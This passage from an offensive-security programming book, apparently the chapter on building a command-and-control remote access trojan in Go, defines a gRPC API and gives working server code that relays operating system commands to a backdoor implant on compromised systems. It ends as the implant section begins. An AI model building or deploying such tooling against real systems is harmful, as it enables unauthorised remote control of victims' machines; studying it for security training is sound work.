structures need to be defined in order to make them easy to serialize and 
deserialize. Luckily for us, there’s a mechanism for defining our data and 
API functions so we can use them with gRPC. This mechanism, Protocol 
Buffers (or Protobuf, for short), includes a standard syntax for API and 
complex data definitions in the form of a .proto file. Tooling exists to com­
pile that definition file into Go­friendly interface stubs and data types. In 
fact, this tooling can produce output in a variety of languages, meaning you 
can use the .proto file to generate C# stubs and types.
Your first order of business is to install the Protobuf compiler on your 
system. Walking through the installation is outside the scope of this book, 
but you’ll find full details under the “Installation” section of the official Go 
Protobuf repository at https://github.com/golang/protobuf/. Also, while you’re 
at it, install the gRPC package with the following command:
> go get -u google.golang.org/grpc
Building a Command-and-Control RAT    317
Creating the Project Workspace
Next, let’s create our project workspace. We’ll create four subdirectories to 
account for the three components (the implant, server, and admin compo­
nent) and the gRPC API definition files. In each of the component direc­
tories, we’ll create a single Go file (of the same name as the encompassing 
directory) that’ll belong to its own main package. This lets us independently 
compile and run each as a stand­alone component and will create a descrip­
tive binary name in the event we run go build on the component. We’ll also 
create a file named implant.proto in our grpcapi directory. That file will hold 
our Protobuf schema and gRPC API definitions. Here’s the directory struc­
ture you should have:
$ tree
.
|-- client
|   |-- client.go
|-- grpcapi
|   |-- implant.proto
|-- implant
|   |-- implant.go
|-- server
    |-- server.go
With the structure created, we can begin building our implementation. 
Throughout the next several sections, we’ll walk you through the contents 
of each file. 
Defining and Building the gRPC API
The next order of business is to define the functionality and data our gRPC 
API will use. Unlike building and consuming REST endpoints, which have 
a fairly well­defined set of expectations (for example, they use HTTP verbs 
and URL paths to define which action to take on which data), gRPC is more 
arbitrary. You effectively define an API service and tie to it the function proto­
types and data types for that service. We’ll use Protobufs to define our API. 
You can find a full explanation of the Protobuf syntax with a quick Google 
search, but we’ll briefly explain it here.
At a minimum, we’ll need to define an administrative service used by 
operators to send operating system commands (work) to the server. We’ll also 
need an implant service used by our implant to fetch work from the server 
and send the command output back to the server. Listing 14­1 shows the 
contents of the implant.proto file. (All the code listings at the root location of / 
exist under the provided github repo https://github.com/blackhat-go/bhg/.)
//implant.proto
syntax = "proto3";
u package grpcapi;
318   Chapter 14
// Implant defines our C2 API functions
v service Implant {
    rpc FetchCommand (Empty) returns (Command);
    rpc SendOutput (Command) returns (Empty);
}
// Admin defines our Admin API functions
w service Admin {
    rpc RunCommand (Command) returns (Command);
}
// Command defines a with both input and output fields
x message Command {
    string In = 1;
    string Out = 2;
}
// Empty defines an empty message used in place of null
y message Empty {
}
Listing 14-1: Defining the gRPC API by using Protobuf (/ch-14/grpcapi/implant.proto)
Recall how we intend to compile this definition file into Go­specific 
artifacts? Well, we explicitly include package grpcapi u to instruct the com­
piler that we want these artifacts created under the grpcapi package. The 
name of this package is arbitrary. We picked it to ensure that the API code 
remains separate from the other components.
Our schema then defines a service named Implant and a service named 
Admin. We’re separating these because we expect our Implant component 
to interact with our API in a different manner than our Admin client. For 
example, we wouldn’t want our Implant sending operating system command 
work to our server, just as we don’t want to require our Admin component to 
send command output to the server. 
We define two methods on the Implant service: FetchCommand and Send 
Output v. Defining these methods is like defining an interface in Go. We’re 
saying that any implementation of the Implant service will need to imple­
ment those two methods. FetchCommand, which takes an Empty message as 
a parameter and returns a Command message, will retrieve any outstand­
ing operating system commands from the server. SendOutput will send a 
Command message (which contains command output) back to the server. 
These messages, which we’ll cover momentarily, are arbitrary, complex 
data structures that contain fields necessary for us to pass data back and 
forth between our endpoints.
Our Admin service defines a single method: RunCommand, which takes a 
Command message as a parameter and expects to read a Command message back w. 
Its intention is to allow you, the RAT operator, to run an operating system 
command on a remote system that has a running implant.
Building a Command-and-Control RAT    319
Lastly, we define the two messages we’ll be passing around: Command and 
Empty. The Command message contains two fields, one used for maintaining 
the operating system command itself (a string named In) and one used 
for maintaining the command output (a string named Out) x. Note that 
the message and field names are arbitrary, but that we assign each field 
a numerical value. You might be wondering how we can assign In and Out 
numerical values if we defined them to be strings. The answer is that this is 
a schema definition, not an implementation. Those numerical values repre­
sent the offset within the message itself where those fields will appear. We’re 
saying In will appear first, and Out will appear second. The Empty message 
contains no fields y. This is a hack to work around the fact that Protobuf 
doesn’t explicitly allow null values to be passed into or returned from an 
RPC method.
Now we have our schema. To wrap up the gRPC definition, we need to 
compile the schema. Run the following command from the grpcapi directory:
> protoc -I . implant.proto --go_out=plugins=grpc:./
This command, which is available after you complete the initial instal­
lation we mentioned earlier, searches the current directory for the Protobuf 
file named implant.proto and produces Go­specific output in the current 
directory. Once you execute it successfully, you should have a new file 
named implant.pb.go in your grpcapi directory. This new file contains the 
interface and struct definitions for the services and messages created in 
the Protobuf schema. We’ll leverage this for building our server, implant, 
and admin component. Let’s build these one by one.
Creating the Server
Let’s start with the server, which will accept commands from the admin 
client and polling from the implant. The server will be the most complicated 
of the components, since it’ll need to implement both the Implant and Admin 
services. Plus, since it’s acting as a middleman between the admin component 
and implant, it’ll need to proxy and manage messages coming to and from 
each side. 
Implementing the Protocol Interface
Let’s first look at the guts of our server in server/server.go (Listing 14­2). 
Here, we’re implementing the interface methods necessary for the server 
to read and write commands from and to shared channels.
u type implantServer struct {
    work, output chan *grpcapi.Command
}
320   Chapter 14
type adminServer struct {
    work, output chan *grpcapi.Command
}
v func NewImplantServer(work, output chan *grpcapi.Command) *implantServer {
    s := new(implantServer)
    s.work = work
    s.output = output
    return s
}
func NewAdminServer(work, output chan *grpcapi.Command) *adminServer {
    s := new(adminServer)
    s.work = work
    s.output = output
    return s
}
w func (s *implantServer) FetchCommand(ctx context.Context, \
empty *grpcapi.Empty) (*grpcapi.Command, error) {
    var cmd = new(grpcapi.Command)
    x select {
    case cmd, ok := <-s.work:
        if ok {
            return cmd, nil
        }
        return cmd, errors.New("channel closed") 
    default:
        // No work
        return cmd, nil
    }
}
y func (s *implantServer) SendOutput(ctx context.Context, \ 
  result *grpcapi.Command) 
(*grpcapi.Empty, error) {
    s.output <- result
    return &grpcapi.Empty{}, nil
}
z func (s *adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) \
(*grpcapi.Command, error) {
    var res *grpcapi.Command
    go func() {
        s.work <- cmd
    }()
    res = <-s.output
    return res, nil
}
Listing 14-2: Defining the server types (/ch-14/server /server.go)
To serve our admin and implant APIs, we need to define server types 
that implement all the necessary interface methods. This is the only way 
Building a Command-and-Control RAT    321
we can start an Implant or Admin service. That is, we’ll need to have the Fetch 
Command(ctx context.Context, empty *grpcapi.Empty), SendOutput(ctx context 
.Context, result *grpcapi.Command), and RunCommand(ctx context.Context, cmd 
*grpcapi.Command) methods properly defined. To keep our implant and 
admin APIs mutually exclusive, we’ll implement them as separate types.
First, we create our structs, named implantServer and adminServer, that’ll 
implement the necessary methods u. Each type contains identical fields: 
two channels, used for sending and receiving work and command output. 
This is a pretty simple way for our servers to proxy the commands and their 
responses between the admin and implant components. 
Next, we define a couple of helper functions, NewImplantServer(work, output 
chan *grpcapi.Command) and NewAdminServer(work, output chan *grpcapi .Command), 
that create new implantServer and adminServer instances v. These exist solely 
to make sure the channels are properly initialized.
Now comes the interesting part: the implementation of our gRPC 
methods. You might notice that the methods don’t exactly match the Protobuf 
schema. For example, we’re receiving a context.Context parameter in each 
method and returning an error. The protoc command you ran earlier to 
compile your schema added these to each interface method definition in 
the generated file. This lets us manage request context and return errors. 
This is pretty standard stuff for most network communications. The com­
piler spared us from having to explicitly require that in our schema file.
The first method we implement on our implantServer, FetchCommand(ctx 
context.Context, empty *grpcapi.Empty), receives a *grpcapi.Empty and returns 
a *grpcapi.Command w. Recall that we defined this Empty type because gRPC 
doesn’t allow null values explicitly. We don’t need to receive any input since 
the client implant will call the FetchCommand(ctx context.Context, empty *grpcapi 
 .Empty) method as sort of a polling mechanism that asks, “Hey, do you have 
work for me?” The method’s logic is a bit more complicated, since we can 
send work to the implant only if we actually have work to send. So, we use 
a select statement x on the work channel to determine whether we do have 
work. Reading from a channel in this manner is nonblocking, meaning that 
execution will run our default case if there’s nothing to read from the 
channel. This is ideal, since we’ll have our implant calling FetchCommand(ctx 
context.Context, empty *grpcapi.Empty) on a periodic basis as a way to get 
work on a near­real­time schedule. In the event that we do have work in the 
channel, we return the command. Behind the scenes, the command will be 
serialized and sent over the network back to the implant.
The second implantServer method, SendOutput(ctx context.Context, 
result *grpcapi.Command), pushes the received *grpcapi.Command onto the output 
channel y. Recall that we defined our Command to have not only a string field 
for the command to run, but also a field to hold the command’s output. Since 
the Command we’re receiving has the output field populated with the result of a 
command (as run by the implant) the SendOutput(ctx context.Context, result 
*grpcapi.Command) method simply takes that result from the implant and puts 
it onto a channel that our admin component will read from later. 
The last implantServer method, RunCommand(ctx context.Context, cmd 
*grpcapi .Command), is defined on the adminServer type. It receives a Command 
322   Chapter 14
that has not yet been sent to the implant z. It represents a unit of work our 
admin component wants our implant to execute. We use a goroutine to 
place our work on the work channel. As we’re using an unbuffered channel, 
this action blocks execution. We need to be able to read from the output 
channel, though, so we use a goroutine to put work on the channel and 
continue execution. Execution blocks, waiting for a response on our output 
channel. We’ve essentially made this flow a synchronous set of steps: send 
a command to an implant and wait for a response. When we receive the 
response, we return the result. Again, we expect this result, a Command, to have 
its output field populated with the result of the operating system command 
executed by the implant.
Writing the main() Function
Listing 14­3 shows the server/server.go file’s main() function, which runs two 
separate servers—one to receive commands from the admin client and the 
other to receive polling from the implant. We have two listeners so that we 
can restrict access to our admin API—we don’t want just anyone interact­
ing with it—and we want to have our implant listen on a port that you can 
access from restrictive networks. 
func main() {
    u var (
        implantListener, adminListener net.Listener
        err                            error
        opts                           []grpc.ServerOption
        work, output                   chan *grpcapi.Command
    )
    v work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
    w implant := NewImplantServer(work, output)
    admin := NewAdminServer(work, output)
    x if implantListener, err = net.Listen("tcp", \
    fmt.Sprintf("localhost:%d", 4444)); err != nil {
        log.Fatal(err)
    }
    if adminListener, err = net.Listen("tcp", \
    fmt.Sprintf("localhost:%d", 9090)); err != nil {
        log.Fatal(err)
    }
    y grpcAdminServer, grpcImplantServer := \
    grpc.NewServer(opts...), grpc.NewServer(opts...)
    z grpcapi.RegisterImplantServer(grpcImplantServer, implant)
    grpcapi.RegisterAdminServer(grpcAdminServer, admin)
    { go func() {
        grpcImplantServer.Serve(implantListener)
    }()
    | grpcAdminServer.Serve(adminListener)
}
Listing 14-3: Running admin and implant servers (/ch-14/server/server.go)
Building a Command-and-Control RAT    323
First, we declare variables u. We use two listeners: one for the implant 
server and one for the admin server. We’re doing this so that we can serve 
our admin API on a port separate from our implant API. 
We create the channels we’ll use for passing messages between the 
implant and admin services v. Notice that we use the same channels for 
initializing both the implant and admin servers via calls to NewImplantServer 
(work, output) and NewAdminServer(work, output) w. By using the same channel 
instances, we’re letting our admin and implant servers talk to each other 
over this shared channel. 
Next, we initiate our network listeners for each server, binding our 
implantListener to port 4444 and our adminListener to port 9090 x. We’d 
generally use port 80 or 443, which are HTTP/s ports that are commonly 
allowed to egress networks, but in this example, we just picked an arbitrary 
port for testing purposes and to avoid interfering with other services run­
ning on our development machines.
We have our network­level listeners defined. Now we set up our gRPC 
server and API. We create two gRPC server instances (one for our admin 
API and one for our implant API) by calling grpc.NewServer() y. This initial­
izes the core gRPC server that will handle all the network communications 
and such for us. We just need to tell it to use our API. We do this by reg­
istering instances of API implementations (named implant and admin in 
our example) by calling grpcapi.RegisterImplantServer(grpcImplantServer, 
implant) z and grpcapi.RegisterAdminServer(grpcAdminServer, admin). Notice 
that, although we have a package we created named grpcapi, we never defined 
these two functions; the protoc command did. It created these functions for 
us in implant.pb.go as a means to create new instances of our implant and 
admin gRPC API servers. Pretty slick!
At this point, we’ve defined the implementations of our API and reg­
istered them as gRPC services. The last thing we do is start our implant 
server by calling grpcImplantServer.Serve(implantListener) {. We do this from 
within a goroutine to prevent the code from blocking. After all, we want to 
also start our admin server, which we do via a call to grpcAdminServer.Serve 
(adminListener) |.
Your server is now complete, and you can start it by running go run 
server/server.go. Of course, nothing is interacting with your server, so nothing 
will happen yet. Let’s move on to the next component—our implant.
Creating the Client Implant
The client implant is designed to run on compromised systems. It will act 
as a backdoor through which we can run operating system commands. In 
this example, the implant will periodically poll the server, asking for work. If 
there is no work to be done, nothing happens. Otherwise, the implant exe­